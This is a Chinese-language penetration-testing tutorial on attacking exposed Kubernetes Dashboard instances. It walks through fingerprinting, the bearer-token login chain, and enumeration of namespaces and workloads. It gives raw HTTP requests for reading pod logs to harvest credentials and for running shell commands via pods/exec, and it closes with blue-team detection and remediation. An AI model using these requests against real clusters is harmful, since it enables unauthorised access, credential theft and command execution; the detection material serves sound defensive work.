---
title: "Kubernetes Dashboard管理面打点与接口利用技术"
date: 2026-06-15T11:36:24+08:00
draft: false
weight: 57
description: "围绕Kubernetes Dashboard相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "容器平台", "Kubernetes Dashboard"]
---

# Kubernetes Dashboard管理面打点与接口利用技术

`Kubernetes Dashboard` 是典型的高价值集群管理面。它的风险不只是“有一个 K8s Web UI 可访问”，而在于它通常同时暴露：

- 集群、命名空间、节点、工作负载与事件视图
- Pod 日志查看与部分调试能力
- 依赖 Bearer Token 的身份边界与低权限校验结果
- 由 Dashboard 反向代理到下游 Kubernetes API 的操作链
- Settings、CSRF、metrics scraper 与默认部署对象信息
- 常见的 NodePort / LoadBalancer / Ingress 暴露与长期 Token 滥用问题

一旦 Dashboard 被暴露到低信任网络、接入链路通过反向代理转发了认证头、存在长期有效的 ServiceAccount Token，或者历史环境仍启用了 `skip login` / `insecure login`，攻击者通常可以在打点阶段快速获得：

- 集群与命名空间清单
- Pod、Deployment、DaemonSet、Job 等工作负载画像
- 日志中暴露的内部地址、口令线索、环境变量与报错栈
- 当前 Token 的真实 RBAC 边界
- 能否继续进入 `pods/log`、`pods/exec`、`services/proxy` 等高价值子资源
- Dashboard 自身部署结构与安全薄弱点

本文只聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Kubernetes Dashboard
2. 如何区分新版 `7.x` 组件拆分架构与旧版单体部署
3. 如何围绕 Bearer Token、CSRF、登录链与 `Authorization` 头行为建立攻击画像
4. 如何从命名空间、工作负载、日志与 `exec` 面判断实际收益
5. 蓝队如何从 Ingress / 反向代理日志、Dashboard 日志与 Kubernetes 审计日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见路径

首轮至少应枚举：

- `/`
- `/#/login`
- `/api/v1/csrftoken/login`
- `/api/v1/login`
- `/api/v1/me`
- `/api/v1/login/status`
- `/api/v1/namespace`
- `/api/v1/settings/global`
- `/api/v1/settings/global/cani`
- `/api/v1/systembanner`
- `/metrics`

如果目标是通过 `kubectl proxy` 或 API Server 代理链暴露，还要关注：

- `/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/`
- `/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard-kong-proxy:/proxy/`

如果目标是新版 Helm 默认安装的 `7.x` 架构，还应在集群内部或清单中留意以下服务名：

- `kubernetes-dashboard-web`
- `kubernetes-dashboard-api`
- `kubernetes-dashboard-auth`
- `kubernetes-dashboard-metrics-scraper`
- `kubernetes-dashboard-kong-proxy`

### 0.2 打点收益优先级

按“最快转成真实攻击价值”的顺序，常见收益可排列为：

1. 确认是否为 Dashboard、版本风格与暴露方式
2. 确认是否可直接访问登录页、CSRF 与会话检查接口
3. 用 Bearer Token 验证命名空间、工作负载、日志与设置面
4. 判断当前 Token 是否具备 `pods/log`、`pods/exec`、`services/proxy` 等能力
5. 判断是否存在旧版 `skip login`、不安全暴露、长期 Token 或错误转发认证头

---

## 1. 第一轮打点：确认是否为 Kubernetes Dashboard

### 1.1 Web 页面识别

#### 请求示例

```http
GET / HTTP/1.1
Host: dashboard.target.example
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: kong/3.6.1
```

```html
<!doctype html>
<html>
  <head>
    <title>Kubernetes Dashboard</title>
  </head>
</html>
```

页面中常见识别特征包括：

- `Kubernetes Dashboard`
- `Sign in`
- `Enter token`
- `Kubernetes`

如果页面前端资源被代理改写，`/api/v1/csrftoken/login`、`/api/v1/me`、`/api/v1/namespace` 往往更稳定。

### 1.2 新版 `7.x` 架构识别

2024 年后的官方 Helm 部署通常不是单个 `kubernetes-dashboard` Pod，而是拆成 `web`、`api`、`auth`、`metrics-scraper` 和 `kong-proxy` 等多个服务。公开问题与安装输出中经常可见：

- `kubernetes-dashboard-api`
- `kubernetes-dashboard-auth`
- `kubernetes-dashboard-kong-proxy`

这类结构对打点的意义在于：

- 登录接口、页面静态资源与业务 API 可能由不同后端处理
- 代理转发错误时常见 `500`、`401`、解析错误和 HTTPS 后端误配
- 某些只路由 `/` 的反向代理会让登录页能打开，但 `/api/v1/login`、`/api/v1/me` 实际失败

### 1.3 历史代理路径识别

#### 请求示例

```http
GET /api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/ HTTP/1.1
Host: kube-api-proxy.target.example
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

这类路径一旦出现，说明目标可能是：

- 通过 `kubectl proxy` 临时暴露
- 通过 API Server 代理 URL 暴露
- 旧版运维文档或临时脚本中保留下来的访问链

---

## 2. 第二轮打点：登录链、Token 与认证头

### 2.1 当前主流登录模型

Kubernetes 官方文档当前明确说明，Dashboard 现在默认只支持通过 `Bearer Token` 登录。官方推荐的安全访问方式通常是：

- `kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard-kong-proxy 8443:443`
- 在本地浏览器访问 `https://localhost:8443`
- 再手工输入 Bearer Token

这意味着对攻击者来说，真正的关键不在“爆破一个 Dashboard 口令框”，而在：

- 是否已经从别处拿到了有效 Token
- 该 Token 对 API Server 的 RBAC 实际放开到什么程度
- 反向代理是否把认证头错误地送入 Dashboard

### 2.2 CSRF Token 获取

新版与旧版登录链都会先请求 CSRF Token。

#### 请求示例

```http
GET /api/v1/csrftoken/login HTTP/1.1
Host: dashboard.target.example
Accept: application/json
Referer: https://dashboard.target.example/
Connection: close
```

#### 典型响应示例

```json
{
  "token": "0DOfgDfufDG72jfoAYD3w6I5ol4:1545607867708"
}
```

这条响应的价值包括：

- 说明 Dashboard 后端 API 可达
- 说明前端登录链基本完整
- 后续可以继续测试 `/api/v1/login`、`/api/v1/me`

### 2.3 Bearer Token 登录

#### 请求示例

```http
POST /api/v1/login HTTP/1.1
Host: dashboard.target.example
Content-Type: application/json
X-CSRF-TOKEN: 0DOfgDfufDG72jfoAYD3w6I5ol4:1545607867708
Accept: application/json
Connection: close

{
  "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6InBTYVQtR2tkUjFxQWNMM3E3ZElDUUkwSVNub0d0a2xDUDRuVGY2bndKNjQifQ.eyJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciIsImt1YmVybmV0ZXMuaW8iOnsibmFtZXNwYWNlIjoia3ViZXJuZXRlcy1kYXNoYm9hcmQiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYWRtaW4tdXNlciJ9fX0.signature",
  "username": "",
  "password": "",
  "kubeConfig": ""
}
```

#### 典型成功响应示例

```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: jweToken=eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4R0NNIn0...; Path=/; HttpOnly; Secure
```

更关键的不是登录响应本身，而是后续会话校验是否成功。

### 2.4 会话校验 `/api/v1/me`

#### 请求示例

```http
GET /api/v1/me HTTP/1.1
Host: dashboard.target.example
Cookie: jweToken=eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4R0NNIn0...
Accept: application/json
Connection: close
```

#### 典型成功响应示例

```json
{
  "name": "system:serviceaccount:kubernetes-dashboard:admin-user",
  "authenticated": true
}
```

#### 典型失败响应示例

```json
{
  "ErrStatus": {
    "status": "Failure",
    "message": "MSG_LOGIN_UNAUTHORIZED_ERROR",
    "reason": "Unauthorized",
    "code": 401
  }
}
```

如果这里返回 `401` 或 `500`，通常说明：

- Token 对 API Server 不可用
- 代理没有把登录态正确带到 `me` 检查
- Ingress / Gateway 只转发了登录页，没有完整转发 `/api` 链

### 2.5 `/api/v1/login/status`

#### 请求示例

```http
GET /api/v1/login/status HTTP/1.1
Host: dashboard.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "tokenPresent": true,
  "headerPresent": false,
  "httpsMode": true
}
```

这个接口对打点很有用，因为它能帮助判断：

- 当前浏览器或代理链里是否已经携带登录态
- 是否处在 HTTPS 模式
- 是走 UI 登录态还是走请求头认证

### 2.6 历史 `Authorization` 头模式

旧版文档明确提到，Dashboard 支持 `Authorization: Bearer <token>` 头方式，并且如果请求头存在，登录页会被跳过。该模式在某些旧环境和前置 OAuth2 / OIDC 反向代理链中仍会遇到。

#### 请求示例

```http
GET / HTTP/1.1
Host: dashboard.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: text/html
Connection: close
```

#### 典型结果

- 请求头被完整透传时，可能直接进入已登录界面
- 如果经过 API Server Proxy 或 `kubectl port-forward` 风格链路，额外认证头可能被丢弃
- 某些 Gateway / Ingress 看似配置了认证，但到 Dashboard 后实际没有收到 `Authorization`

这条历史行为非常重要，因为它解释了很多“登录页存在但实际上已经可被自动认证接管”的场景。

---

## 3. 第三轮打点：命名空间、总览与设置面

### 3.1 枚举命名空间

#### 请求示例

```http
GET /api/v1/namespace HTTP/1.1
Host: dashboard.target.example
Cookie: jweToken=eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "namespaces": [
    {
      "objectMeta": {
        "name": "default"
      }
    },
    {
      "objectMeta": {
        "name": "kube-system"
      }
    },
    {
      "objectMeta": {
        "name": "payment-prod"
      }
    }
  ]
}
```

这条响应可以直接回收：

- 环境命名体系
- 业务命名空间
- 是否存在高价值命名空间，如 `argocd`、`cattle-system`、`monitoring`、`prod`

### 3.2 读取某命名空间总览

#### 请求示例

```http
GET /api/v1/overview/payment-prod?filterBy=&itemsPerPage=10&name=&page=1&sortBy=d,creationTimestamp HTTP/1.1
Host: dashboard.target.example
Cookie: jweToken=eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "workloads": {
    "deploymentList": {
      "items": [
        {
          "objectMeta": {
            "name": "payment-api"
          },
          "pods": {
            "running": 6,
            "desired": 6
          }
        }
      ]
    }
  },
  "errors": []
}
```

总览接口的价值在于一次性暴露：

- Deployment / DaemonSet / StatefulSet 分布
- 运行副本数
- 高价值应用名称
- 命名空间是否为空、测试环境还是生产环境

### 3.3 全局设置接口

#### 请求示例

```http
GET /api/v1/settings/global HTTP/1.1
Host: dashboard.target.example
Cookie: jweToken=eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "serverTime": 1760319987123
}
```

虽然这个接口本身不一定很敏感，但它很适合判断：

- 后端 API 是否稳定
- 当前会话是否可正常访问基础设置面

### 3.4 `settings/global/cani`

这个端点背后本质上是对 `kubernetes-dashboard-settings` 这个 ConfigMap 的 `SelfSubjectAccessReview` 校验。

#### 请求示例

```http
GET /api/v1/settings/global/cani HTTP/1.1
Host: dashboard.target.example
Cookie: jweToken=eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "allowed": true
}
```

#### 典型失败响应示例

```json
{
  "allowed": false
}
```

这类返回虽然只是布尔值，但意义非常直接：

- `allowed=true` 说明当前身份至少可读取 Dashboard 设置相关 ConfigMap
- `allowed=false` 说明当前是受限 Token，但仍可能具备其它资源读取能力

### 3.5 `systembanner`

#### 请求示例

```http
GET /api/v1/systembanner HTTP/1.1
Host: dashboard.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "message": "",
  "severity": "INFO"
}
```

虽然业务价值有限，但这个端点常被用作判断：

- 前端是否能正常拉取配置类 API
- 反向代理是否遗漏了部分 `/api/v1/*` 路由

---

## 4. 第四轮打点：工作负载、日志与调试价值

### 4.1 工作负载枚举的真实收益

Dashboard 的核心收益不只是看 UI，而是它把大量 Kubernetes 对象以低门槛方式整理成：

- 节点
- Pod
- Deployment
- StatefulSet
- ConfigMap
- Secret 引用关系
- 事件与最近异常

因此只要一个 Token 能通过 Dashboard 看见这些对象，它就已经具备非常高的侦察价值。

### 4.2 Pod 日志面

Kubernetes 官方文档明确说明，Dashboard 内置了 Pod 日志查看器。对攻击者来说，日志面常常比对象列表更有价值，因为它能直接回收：

- 内部服务地址
- 数据库连接报错
- 明文调试日志
- JWT、Access Key、临时凭据
- 配置加载失败时输出的环境信息

#### Kubernetes API 请求示例

```http
GET /api/v1/namespaces/payment-prod/pods/payment-api-5c9b88c7fb-rj4tm/log?container=payment-api&tailLines=200 HTTP/1.1
Host: 10.96.0.1:443
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: */*
Connection: close
```

#### 典型响应示例

```text
2026-06-13T09:14:11Z INFO Starting payment-api
2026-06-13T09:14:12Z INFO Loaded profile prod
2026-06-13T09:14:13Z WARN Redis auth failed for redis://10.20.41.15:6379
2026-06-13T09:14:13Z ERROR JDBC connection failed: jdbc:postgresql://10.20.42.18:5432/payment
```

### 4.3 `exec` 面的价值边界

Dashboard 的交互式终端能力最终会落到 Kubernetes API 的 `pods/exec` 子资源上。只要当前 Token 具备该权限，Dashboard 不再只是“看面板”，而会直接进入：

- 容器内命令执行
- 文件读取
- 环境变量与挂载内容检查
- ServiceAccount Token 回收
- 对下游服务的二次探测

#### Kubernetes API 请求示例

```http
POST /api/v1/namespaces/payment-prod/pods/payment-api-5c9b88c7fb-rj4tm/exec?command=/bin/sh&command=-c&command=id&container=payment-api&stdin=true&stdout=true&stderr=true&tty=true HTTP/1.1
Host: 10.96.0.1:443
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Protocol: v4.channel.k8s.io
```

#### 典型响应示例

```text
uid=1000 gid=1000 groups=1000
```

一旦这类请求成功，风险等级已经从“管理面暴露”升级到“集群内命令执行能力暴露”。

### 4.4 失败响应也有价值

#### 典型失败响应示例

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "status": "Failure",
  "message": "pods \"payment-api-5c9b88c7fb-rj4tm\" is forbidden: User \"system:serviceaccount:kubernetes-dashboard:readonly-user\" cannot create resource \"pods/exec\" in API group \"\" in the namespace \"payment-prod\"",
  "reason": "Forbidden",
  "code": 403
}
```

这类失败同样有意义，因为它精确暴露了：

- 当前身份
- 被拒绝的资源
- 被拒绝的 verb
- 命名空间范围

对后续 RBAC 画像极有帮助。

---

## 5. 第五轮打点：metrics scraper、默认对象与部署误配

### 5.1 `metrics-scraper` 的意义

Dashboard 文档明确指出：

- API 容器需要 `services/proxy` 权限以访问 `dashboard-metrics-scraper`
- `metrics-scraper` 需要对 `metrics.k8s.io` 具备 `get`、`list`、`watch`

这意味着在风险评估时，除了 Dashboard 自身，还应核查：

- `kubernetes-dashboard-metrics-scraper`
- `services/proxy`
- `metrics.k8s.io`

因为这些对象决定了：

- 节点 / Pod 资源用量能否被查看
- 当前部署是否保留了额外代理能力

### 5.2 默认命名对象

Dashboard 默认或常见部署中，常见对象包括：

- `kubernetes-dashboard-settings`
- `kubernetes-dashboard-csrf`
- `kubernetes-dashboard-key-holder`
- `kubernetes-dashboard-kong-proxy`

对打点来说，这些对象的意义分别是：

- `settings`：设置存储与权限校验目标
- `csrf`：登录前置链条
- `key-holder`：会话加密相关
- `kong-proxy`：很多 7.x 场景下的统一入口

### 5.3 路由误配

公开问题中非常常见的一类情况是：

- 只把 `/` 转到 `web`
- 把 `/api/v1/login`、`/api/v1/csrftoken/login`、`/api/v1/me` 漏掉
- 或把 HTTPS 后端当成 HTTP 后端去连

这会导致以下现象：

- 登录页能打开，但登录后 401 / 500
- `/metrics` 返回 500
- `Http failure during parsing`
- 代理日志只显示根路径正常，API 子路径异常

从打点角度看，这类“坏配置”同样很有价值，因为它说明：

- 目标确实部署了 Dashboard
- 入口是人工拼接或非标准接入
- 可能存在错误转发认证头、错误暴露 `/metrics` 或 `/api` 子路径的机会

---

## 6. 历史高危面与真实暴露链

### 6.1 `skip login` 与不安全登录

历史版本中最危险的配置包括：

- `--enable-skip-login`
- `--enable-insecure-login=true`
- `--insecure-bind-address=0.0.0.0`
- `NodePort` / `LoadBalancer` 直接公开

这类组合的真实风险不是“省去登录步骤”，而是：

- 直接以 Dashboard 自身 ServiceAccount 权限进入集群视图
- 如果绑定了 `cluster-admin`，则等价于未授权控制平面

### 6.2 公开暴露的真实案例

Tesla 2018 年公开事件中，研究人员披露其未受保护的 Kubernetes 管理控制台被入侵者用于部署挖矿程序，并进一步暴露云环境中的敏感凭据与遥测数据。这个案例长期被视为 Dashboard 暴露风险的代表性样本。

从方法学上看，这类事件说明：

- Dashboard 暴露的直接收益不只是“看见资源”
- 攻击者会把它当作跳板去找容器内凭据、云账户凭据和更多控制面

### 6.3 长期 Token 风险

官方示例用户文档与大量社区问题中都能看到通过 `cluster-admin` 绑定的 `admin-user` ServiceAccount 创建登录 Token 的做法。问题在于：

- 很多环境把这个示例当生产做法
- 很多 Token 长期保留在运维脚本、剪贴板、Wiki、CI 变量或浏览器密码库

因此在打点中，一旦发现：

- `admin-user`
- `cluster-admin`
- `kubernetes-dashboard` 命名空间中的长期 ServiceAccount Token

就应优先判断其是否仍然有效。

### 6.4 项目归档带来的额外风险

截至 2026 年 1 月，Kubernetes Dashboard 仓库已被归档。对防守侧而言，这意味着：

- 后续安全修复预期降低
- 历史暴露面更可能作为遗留资产长期存在
- 已部署环境更需要通过外围访问控制、RBAC 最小化和凭据治理兜底

---

## 7. 打点流程建议

更稳的 Kubernetes Dashboard 打点流程通常如下：

### 7.1 第一轮：识别产品与入口

优先请求：

- `/`
- `/#/login`
- `/api/v1/csrftoken/login`
- `/api/v1/me`

目标：

- 确认是否为 Dashboard
- 判断是新版 `7.x` 拆分架构还是旧版单体
- 判断反向代理是否完整转发了 API 链

### 7.2 第二轮：认证链判断

优先请求：

- `/api/v1/csrftoken/login`
- `/api/v1/login`
- `/api/v1/login/status`
- `/api/v1/me`

目标：

- 判断 Bearer Token 是否可建立会话
- 判断是否存在错误转发认证头
- 判断失败是出在 Token、CSRF、Ingress 还是下游 API

### 7.3 第三轮：对象画像

优先请求：

- `/api/v1/namespace`
- `/api/v1/overview/{namespace}`
- `/api/v1/settings/global`
- `/api/v1/settings/global/cani`

目标：

- 建立命名空间与工作负载画像
- 判断当前 Token 是否可继续扩展到设置和更多资源面

### 7.4 第四轮：运行期收益验证

优先验证：

- `pods/log`
- `pods/exec`
- metrics
- events

目标：

- 判断是否能读取运行期日志
- 判断是否能进入容器执行
- 判断当前凭据是否已具备实质性操作能力

### 7.5 第五轮：历史暴露面复核

优先检查：

- `skip login`
- `insecure login`
- `NodePort` / `LoadBalancer`
- 示例 `admin-user` Token

目标：

- 判断环境是否仍保留可直接接管的旧风险面

---

## 8. 蓝队检测与处置

### 8.1 反向代理与 Ingress 访问日志

应重点识别：

- 对 `/api/v1/csrftoken/login`、`/api/v1/login`、`/api/v1/me` 的连续访问
- 对 `/api/v1/namespace`、`/api/v1/overview/*` 的批量读取
- 对 `/metrics` 的异常探测
- 来自非常规 User-Agent 的 Dashboard 访问
- 同一源地址短时间内遍历多个命名空间

#### 日志示例

```text
10.10.10.21 - - [15/Jun/2026:02:41:11 +0800] "GET /api/v1/csrftoken/login HTTP/1.1" 200 53 "-" "Mozilla/5.0"
```

```text
10.10.10.21 - - [15/Jun/2026:02:41:12 +0800] "POST /api/v1/login HTTP/1.1" 200 4247 "https://dashboard.target.example/" "Mozilla/5.0"
```

```text
10.10.10.21 - - [15/Jun/2026:02:41:14 +0800] "GET /api/v1/namespace HTTP/1.1" 200 391 "-" "python-requests/2.32.3"
```

第三条通常说明访问者已经不再是人工浏览，而是在批量化读取资源面。

### 8.2 Dashboard 应用日志

公开问题中的真实日志表明，Dashboard 侧很容易留下以下痕迹：

- `Incoming HTTP/1.1 GET /api/v1/csrftoken/login`
- `Incoming HTTP/1.1 POST /api/v1/login`
- `Incoming HTTP/1.1 GET /api/v1/login/status`
- `Incoming HTTP/1.1 GET /api/v1/settings/global`
- `MSG_LOGIN_UNAUTHORIZED_ERROR`

#### 日志示例

```text
[GIN] 2024/03/14 - 08:58:40 | 200 | 39.46µs | 172.18.1.25 | GET "/api/v1/csrftoken/login"
[GIN] 2024/03/14 - 08:58:40 | 200 | 1.97ms  | 172.18.1.25 | POST "/api/v1/login"
[GIN] 2024/03/14 - 08:58:40 | 500 | 94.71µs | 172.18.1.25 | GET "/api/v1/me"
```

这类链非常适合用于快速识别：

- 登录尝试是否成功
- Token 是否被拒绝
- 失败位置是在会话创建还是会话确认

### 8.3 Kubernetes 审计日志

Kubernetes 官方审计文档明确建议对 `pods/log`、`pods/status` 等子资源单独建规则。对于 Dashboard 打点和利用，应重点关注：

- `users.username`
- `sourceIPs`
- `verb`
- `objectRef.resource`
- `objectRef.subresource`
- `responseStatus.code`

#### 命名空间列表审计示例

```json
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "Metadata",
  "user": {
    "username": "system:serviceaccount:kubernetes-dashboard:admin-user"
  },
  "verb": "list",
  "objectRef": {
    "resource": "namespaces",
    "apiVersion": "v1"
  },
  "sourceIPs": [
    "10.10.10.21"
  ],
  "responseStatus": {
    "code": 200
  }
}
```

#### Pod 日志审计示例

```json
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "Metadata",
  "user": {
    "username": "system:serviceaccount:kubernetes-dashboard:readonly-user"
  },
  "verb": "get",
  "objectRef": {
    "resource": "pods",
    "subresource": "log",
    "namespace": "payment-prod",
    "name": "payment-api-5c9b88c7fb-rj4tm",
    "apiVersion": "v1"
  },
  "responseStatus": {
    "code": 200
  }
}
```

#### Pod Exec 审计示例

```json
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "RequestResponse",
  "user": {
    "username": "system:serviceaccount:kubernetes-dashboard:admin-user"
  },
  "verb": "create",
  "objectRef": {
    "resource": "pods",
    "subresource": "exec",
    "namespace": "payment-prod",
    "name": "payment-api-5c9b88c7fb-rj4tm",
    "apiVersion": "v1"
  },
  "responseStatus": {
    "code": 101
  }
}
```

其中 `pods/exec` 应视为高优先级调查点。

### 8.4 处置建议

发现 Dashboard 正在被打点后，应优先做：

1. 收敛 Dashboard 外网暴露，优先下线 NodePort / LoadBalancer 直出
2. 立即轮换所有用于 Dashboard 登录的长期 ServiceAccount Token
3. 审核 `admin-user`、`cluster-admin` 绑定和示例账户残留
4. 审核是否存在 `skip login`、`insecure login` 或历史不安全参数
5. 检查 `pods/log`、`pods/exec`、`services/proxy` 的审计记录
6. 检查反向代理是否错误转发 `Authorization` 头到 Dashboard

长期建议：

- 不把 Dashboard 暴露给低信任网络
- 只允许通过受控入口和短期 Token 访问
- 对 Dashboard 命名空间与服务建立独立告警
- 审计并最小化 `kubernetes-dashboard` 相关 ServiceAccount 权限
- 对 `pods/exec`、`pods/log`、`services/proxy` 建立单独检测规则

---

## 9. 复盘清单

### 9.1 红队侧

- 是否确认了目标是新版 `7.x` 还是旧版单体部署
- 是否核实了 `/api/v1/csrftoken/login`、`/api/v1/login`、`/api/v1/me` 登录链
- 是否枚举了命名空间与总览接口
- 是否验证了日志与 `exec` 的真实 RBAC 边界
- 是否检查了历史 `skip login` 与长期 Token 风险

### 9.2 蓝队侧

- 是否能识别连续的 `csrftoken/login -> login -> me -> namespace` 访问链
- 是否能识别对 `pods/log` 与 `pods/exec` 的异常访问
- 是否能区分代理误配导致的错误与真实攻击登录
- 是否掌握了 `kubernetes-dashboard` 命名空间中的高危对象和示例账户

### 9.3 应急侧

- 是否确认当前暴露方式是 `port-forward`、Ingress、NodePort 还是 LoadBalancer
- 是否确认是否已有 Token 泄露
- 是否确认是否已发生日志读取或 `exec` 滥用
- 是否完成 Dashboard 相关 Token、ClusterRoleBinding 与入口策略收敛

---

## 10. 总结

`Kubernetes Dashboard` 的真正风险，不在于“有一个图形化页面”，而在于它常常同时连接了：

- 身份认证
- 集群对象枚举
- 运行期日志
- `pods/exec`
- metrics 与代理子资源

对打点来说，更值得沉淀的方法学是：

- 先识别当前版本风格与暴露入口
- 再走通 `csrftoken`、`login`、`me` 登录链
- 再枚举命名空间、总览与设置面
- 最后验证日志、`exec` 和历史高危配置是否存在

这样才能把“Dashboard 可访问”真正转化成结构化的攻击价值判断。

---

## 参考资料

- [Deploy and Access the Kubernetes Dashboard](https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/)
- [Access control](https://github.com/kubernetes-retired/dashboard/blob/master/docs/user/access-control/README.md)
- [Creating sample user](https://github.com/kubernetes-retired/dashboard/blob/master/docs/user/access-control/creating-sample-user.md)
- [Kubernetes Authentication](https://kubernetes.io/docs/reference/access-authn-authz/authentication/)
- [Kubernetes Auditing](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/)
- [Dashboard login failed with response: "tokenPresent": false, "headerPresent": false, "httpsMode": true](https://github.com/kubernetes/dashboard/issues/3464)
- [Bearer Token Authentication not responding](https://github.com/kubernetes/dashboard/issues/8794)
- [Cannot login to the Dashboard: "Failure during parsing" the token](https://github.com/kubernetes/dashboard/issues/9448)
- [Kubernetes Dashboard does not accept Authorization: Bearer token even when passed via Ingress Reverse Proxy](https://github.com/kubernetes/dashboard/issues/10242)
- [Tesla cloud resources are hacked to run cryptocurrency-mining malware](https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware/)
